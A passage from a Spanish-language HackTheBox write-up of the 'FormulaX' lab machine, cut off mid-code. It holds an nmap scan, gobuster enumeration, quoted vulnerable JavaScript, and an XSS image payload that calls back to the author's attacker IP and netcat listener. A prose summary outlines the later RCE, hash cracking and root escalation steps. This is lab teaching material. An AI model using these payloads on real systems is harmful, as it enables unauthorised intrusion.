<!doctype html><html lang=es><head><title>HTB FormulaX WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'FormulaX' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB FormulaX WriteUp"><meta name=twitter:description content="HackThebox 'FormulaX' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/formulax/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB FormulaX WriteUp"><meta property="og:description" content="HackThebox 'FormulaX' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-17T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-17T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Hard"><meta property="article:tag" content="Xss"><meta property="article:tag" content="Gobuster"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/formulax/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/formulax/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/formulax/>HTB FormulaX WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-17T00:00:00Z>17 agosto, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
22 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/hard/>Hard</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/xss/>Xss</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/gobuster/>Gobuster</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/curl/>Curl</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/socket.io/>Socket.io</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/simple-git/>Simple-Git</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/local-port-forwarding/>Local Port Forwarding</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/mongodb/>Mongodb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/librenms/>Librenms</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/blade/>Blade</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/laravel/>Laravel</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/libre-office/>Libre Office</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/exploit-db/>Exploit-Db</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sudo/>Sudo</a></span></div></div></header><div class=post-content><h1 id=formulax----hackthebox>FormulaX &ndash; HackTheBox
<a class=heading-link href=#formulax----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty/Dificultad: <em>Hard</em> / <em>Dif√≠cil</em></li><li>Platform/Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;FormulaX&rsquo; Avatar" src=/pentesting/images/FormulaX_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>FormulaX</code> es una m√°quina de dificultad Dif√≠cil, basada en <code>Linux</code>, de la plataforma <code>HackTheBox</code>. Luego de un escaneo inicial, vemos que el servidor v√≠ctima est√° corriendo un servicio web. Esta p√°gina nos permite crear un usuario en ella. Luego de crearlo, vemos que un formulario de &ldquo;Contact Us&rdquo; es vulnerable a <code>Cross Site Scripting</code> (<code>XSS</code>), el cual nos permite descubrir un nuevo subdominio/virtual host. Este nuevo subdominio est√° corriendo una versi√≥n vulnerable de <code>simple-git</code>, catalogada como <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-24439 class=external-link target=_blank rel=noopener>CVE-2022-24439</a>, la cual permite ejecuci√≥n remota de comandos con lo que podemos ganar acceso inicial a la m√°quina v√≠ctima. Una vez dentro, vemos que la m√°quina v√≠ctima est√° utilizando una base de datos <code>MongoDB</code>. Dentro de √©sta, somos capaces de extraer usuarios y sus hashes de contrase√±as; para luego ser capaces de crackear una de ellas por buerza bruta utilizando el diccionario <code>rockyou.txt</code>. Obtenemos entonces credenciales para un primer usuario, el cual es capaz de ingresar a la m√°quina v√≠ctima por medio de <code>SSH</code>. Una vez dentro como este nuevo usuario, vemos que la m√°quina est√° corriendo <code>LibreNMS</code> y que nuestro usuario es capaz de agregar un usuario &ldquo;admin&rdquo; dentro del portal de <code>LibreNMS</code>. Ya dentro del portal <code>LibreNMS</code> con un usuario que hemos creado, somos capaces de inyectar c√≥digo <code>PHP</code> y conectarnos como el usuario que estaba corriendo el servicio <code>LibreNMS</code>; este usuario tiene acceso a archivos <code>.env</code> los cuales filtran la contrase√±a de un segundo usuario. Este segundo usuario puede inicializar el servicio <code>Libre Office</code> dentro de la m√°quina, el cual puede ser abusado para escalar privilegios y convertirse en <code>root</code>.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Empezando con un scan con<code>Nmap</code> s√≥lo muestra 2 puertos abiertos: <code>22</code> <code>SSH</code> y <code>80</code> <code>HTTP</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.6 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 20:10 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.6
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.18s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-cors: GET POST
</span></span></span><span class=line><span class=cl><span class=go>| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
</span></span></span><span class=line><span class=cl><span class=go>|_Requested resource was /static/index.html
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.88 seconds
</span></span></span></code></pre></div><ul><li>Visitando <code>http://10.10.11.6</code> muestra una simple p√°gina web:</li></ul><p><img alt="FormulaX 1" src=/pentesting/images/FormulaX_1.png></p><ul><li>Si nos creamos un usuario en la p√°gina web, ahora podemos ver un bot√≥n que dice <code>Chat Now</code>. Clickeando en √©ste redirige a <code>http://10.10.11.6/restricted/chat.html</code>. El sitio, aparentemente, presenta un chatbot similar a <code>ChatGPT</code>, pero en una versi√≥n ultra-alpha. Podemos interactuar con el bot de esta p√°gina y &ldquo;hablar&rdquo; con √©l. No obstante, √©ste s√≥lo acepta comandos fijos como <code>help</code> o <code>history</code>:</li></ul><p><img alt="FormulaX 2" src=/pentesting/images/FormulaX_2.png></p><ul><li>En la <code>Home Page</code> del sitio web (<code>http://10.10.11.6/restricted/home.html</code>) podemos ver un bot√≥n de <code>Contact Us</code> (contacto). Clickeando en √©ste redirige a <code>http://10.10.11.6/restricted/contact_us.html</code>, el cual muestra un nuevo formulario que puede ser rellenado:</li></ul><p><img alt="FormulaX 3" src=/pentesting/images/FormulaX_3.png></p><ul><li>Decido rellenar este formulario hasta obtener algo. Para ello empiezo un listener con <code>netcat</code> en el puerto <code>8080</code>. Una data que me retorna algo a mi listener es:</li></ul><p><img alt="FormulaX 4" src=/pentesting/images/FormulaX_4.png></p><p>De manera que, como body del mensaje, pasamos el payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>img</span> <span class=nx>src</span><span class=o>=</span><span class=s1>&#39;http://10.10.16.2:8080/test&#39;</span><span class=o>&gt;</span>
</span></span></code></pre></div><p>donde <code>10.10.16.2</code> es mi IP de atacante.</p><ul><li>Luego de unos segundos de enviar el payload, obtengo algo en mi listener con <code>netcat</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 8080 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.6] 34080
</span></span></span><span class=line><span class=cl><span class=go>GET /test HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.2:8080
</span></span></span><span class=line><span class=cl><span class=go>Connection: keep-alive
</span></span></span><span class=line><span class=cl><span class=go>Pragma: no-cache
</span></span></span><span class=line><span class=cl><span class=go>Cache-Control: no-cache
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/113.0.5672.63 Safari/537.36
</span></span></span><span class=line><span class=cl><span class=go>Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
</span></span></span><span class=line><span class=cl><span class=go>Referer: http://chatbot.htb/
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: gzip, deflate
</span></span></span></code></pre></div><p>de manera que el servidor est√° tratando de obtener un recurso. Encontramos entonces que este formulario es vulnerable a <code>Cross Site Scripting</code> (<code>XSS</code>). Y de all√≠ el nombre de la m√°quina (los cuales siempre dan una pista de c√≥mo resolverla): <code>FormulaX</code> -> Formulario vulnerable a <code>XSS</code>.</p><ul><li>Noto adem√°s que, si aceptamos m√∫ltiples request en un servidor <code>Python</code> <code>HTTP</code> en el mismo puerto que env√≠a el payload (<code>8080</code>), al poner una petici√≥n maliciosa en la p√°gina de <code>Contact Us</code> √©sta no s√≥lo nos est√° solicitando un recurso, sino que nos est√° haciendo m√∫ltiples peticiones:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:16] code 404, message File not found
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:16] &#34;GET /test HTTP/1.1&#34; 404 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:20] code 404, message File not found
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:20] &#34;GET /test HTTP/1.1&#34; 404 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:22] code 404, message File not found
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:22] &#34;GET /test HTTP/1.1&#34; 404 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:26] code 404, message File not found
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:26] &#34;GET /test HTTP/1.1&#34; 404 -
</span></span></span></code></pre></div><ul><li>Ahora bien, la parte realmente dif√≠cil de esta m√°quina es c√≥mo leer la data que nos est√° enviando el servidor v√≠ctima. Necesitamos, de alguna manera, &ldquo;emular&rdquo; los endpoints que el servidor web est√° solicitando y as√≠ poder leer la data enviada desde el servidor. Para esto empezamos a mirar por archivos <code>HTML</code> y <code>JavaScript</code> (<code>.js</code>) en el directorio <code>/restricted</code> con <code>Gobuster</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.6/restricted -t 55 -x html,js
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.10.11.6/restricted
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              js,html
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/about.html           (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/home.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/contact_us.html      (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/contact_us.js        (Status: 200) [Size: 1057]
</span></span></span><span class=line><span class=cl><span class=go>/Home.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/chat.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/chat.js              (Status: 200) [Size: 1491]
</span></span></span><span class=line><span class=cl><span class=go>/About.html           (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/Contact_Us.html      (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/Chat.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/HOME.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/Contact_us.html      (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/changePassword.html  (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/changepassword.html  (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/changepassword.js    (Status: 200) [Size: 1084]
</span></span></span><span class=line><span class=cl><span class=go>/ABOUT.html           (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/ChangePassword.html  (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 661680 / 661683 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>donde encontramos algunos archivos <code>.js</code> que pueden ser de inter√©s.</p><ul><li>Analizando <code>http://10.10.11.6/restricted/contact_us.js</code> muestra el c√≥digo que permite el payload de <code>XSS</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// A function that handles the submit request of the user
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>handleRequest</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>first_name</span> <span class=o>=</span> <span class=kr>await</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;first_name&#39;</span><span class=p>).</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>last_name</span> <span class=o>=</span> <span class=kr>await</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;last_name&#39;</span><span class=p>).</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>message</span> <span class=o>=</span> <span class=kr>await</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>).</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=nx>axios</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=sb>`/user/api/contact_us`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;first_name&#34;</span><span class=o>:</span> <span class=nx>first_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;last_name&#34;</span><span class=o>:</span> <span class=nx>last_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;message&#34;</span><span class=o>:</span> <span class=nx>message</span>
</span></span><span class=line><span class=cl>        <span class=p>}).</span><span class=nx>then</span><span class=p>((</span><span class=nx>response</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;first_name&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;last_name&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// here we are gonna show the error
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>response</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>Message</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Something went Wrong&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;Something went Wrong&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>y revisando el archivo <code>/restricted/chat.js</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>let</span> <span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>res</span> <span class=o>=</span> <span class=nx>axios</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=sb>`/user/api/chat`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>socket</span> <span class=o>=</span> <span class=nx>io</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,{</span><span class=nx>withCredentials</span><span class=o>:</span> <span class=kc>true</span><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//listening for the messages
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>socket</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>my_message</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>//console.log(&#34;Received From Server: &#34; + my_message)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nx>Show_messages_on_screen_of_Server</span><span class=p>(</span><span class=nx>my_message</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>typing_chat</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>value</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;user_message&#39;</span><span class=p>).</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// sending the  messages to the server
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>socket</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s1>&#39;client_message&#39;</span><span class=p>,</span> <span class=nx>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>Show_messages_on_screen_of_Client</span><span class=p>(</span><span class=nx>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// here we will do out socket things..
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;user_message&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Cannot send Empty Messages&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>htmlEncode</span><span class=p>(</span><span class=nx>str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>String</span><span class=p>(</span><span class=nx>str</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/[^\w. ]/gi</span><span class=p>,</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>c</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&amp;#&#39;</span> <span class=o>+</span> <span class=nx>c</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>Show_messages_on_screen_of_Server</span> <span class=o>=</span> <span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;div&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s1>&#39;container&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=sb>`  
</span></span></span><span class=line><span class=cl><span class=sb>  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
</span></span></span><span class=line><span class=cl><span class=sb>    &lt;p&gt;</span><span class=si>${</span><span class=nx>value</span><span class=si>}</span><span class=sb>&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=sb>  `</span>
